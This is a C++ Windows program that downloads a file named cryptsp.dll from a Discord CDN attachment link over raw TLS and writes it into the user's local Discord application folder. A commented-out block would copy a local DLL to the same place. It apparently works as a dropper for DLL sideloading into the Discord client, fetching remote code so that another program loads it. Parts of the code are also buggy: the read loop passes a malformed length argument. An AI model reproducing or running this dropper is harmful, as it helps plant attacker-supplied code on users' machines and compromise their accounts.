#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <string>
#include <openssl/ssl.h>
#include <openssl/crypto.h>
#include <openssl/err.h>

#pragma comment(lib, "Ws2_32.lib") // Vincular con la biblioteca Winsock

void initializeSSL() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanupSSL() {
    EVP_cleanup();
}


void downloadFile(const std::string& host, const std::string& path, const std::string& outputFile) {
    
    SSL_CTX* ctx;
    SSL* ssl;

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct addrinfo* result = nullptr, hints;
    std::ofstream file(outputFile, std::ios::binary);

    std::ofstream fullReq("request.txt");

    // Initialize SSL
    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        std::cerr << "Unable to create SSL context" << std::endl;
        return;
    }

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2);

    

    if (!file) {
        std::cerr << "Unable to open output file." << std::endl;
        return;
    }

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    // Prepare hints
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    if (getaddrinfo(host.c_str(), "443", &hints, &result) != 0) {
        std::cerr << "getaddrinfo failed: " <<GetLastError()<< std::endl;
        WSACleanup();
        return;
    }

    // Create a SOCKET for connecting to the server
    sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    // Connect to the server
    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "Unable to connect to server!" << std::endl;
        closesocket(sock);
        freeaddrinfo(result);
        WSACleanup();
        return;
    }
    // Create SSL structure
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    // Perform SSL handshake
    if (SSL_connect(ssl) <= 0) {
        std::cerr << "SSL handshake failed" << std::endl;
        SSL_free(ssl);
        closesocket(sock);
        SSL_CTX_free(ctx);
        return;
    }

    freeaddrinfo(result);

    // Send HTTP GET request
    std::string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "Connection: close\r\n\r\n";
    SSL_write(ssl, request.c_str(), request.length());

    // Send request
    /*int bytesSent = send(sock, request.c_str(), (int)request.length(), 0);
    if (bytesSent == SOCKET_ERROR) {
        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return;
    }*/

    // Receive response
    std::string response;
    char buffer[8196];
    int bytesRead;
    bool headerParsed = false;
    std::string header;
    while (bytesRead = SSL_read(ssl, buffer, sizeof(buffer) > 0))
    {
        //printf("%s", buffer);
        response.append(buffer, bytesRead);
        fullReq.write(buffer, bytesRead);
    }

    if (bytesRead < 0) {
        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
    }
    size_t headerEnd = response.find("\r\n\r\n");
    std::string headers = response.substr(0, headerEnd);
    std::string body = response.substr(headerEnd + 4);
   
    size_t contentLengthPos = headers.find("Content-Length:");
    
    size_t start = contentLengthPos + 15;
    size_t end = headers.find("\r\n", start);
    std::string contentLengthStr = headers.substr(start, end - start);
    int contentLength = std::stoi(contentLengthStr);

    file.write(body.c_str(), contentLength);

   /* while ((bytesRead = response) {
        printf("%s /n", buffer);
        if (!headerParsed) {
            // Search for the header-body delimiter "\r\n\r\n"
            header.append(buffer, bytesRead);
            size_t pos = header.find("\r\n\r\n");
            if (pos != std::string::npos) {
                headerParsed = true;
                file.write(buffer + pos + 4, bytesRead - pos - 4);
            }
        }
        else {
            // Write the file content after the header
            file.write(buffer, bytesRead);
        }
    }*/

    

    file.close();
    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    WSACleanup();
}


int main() {
	std::string discordPath = std::string(getenv("localappdata")) + "\\Discord\\";
	std::string dllName = "cryptsp.dll";
    initializeSSL();
    downloadFile("cdn.discordapp.com", "/attachments/1294462945769685033/1298346311963377745/cryptsp.dll?ex=67193aba&is=6717e93a&hm=2db7a77636ec79ad75ffde05f9d41a55632fe93adebf9211bf5ab192fb2e1d89&", discordPath + dllName);
    cleanupSSL();

    /*
	std::ifstream OpenDll("Path", std::ios::binary);
		
	

	std::ofstream dll(discordPath + dllName, std::ios::binary);
	
	
	
	char buffer[4096];
	while (OpenDll.read(buffer, sizeof(buffer)))
	{
		dll.write(buffer, sizeof(buffer));
	}

	dll.write(buffer, OpenDll.gcount());
    dll.close();
    OpenDll.close();
    */

	
	
	return 0;
}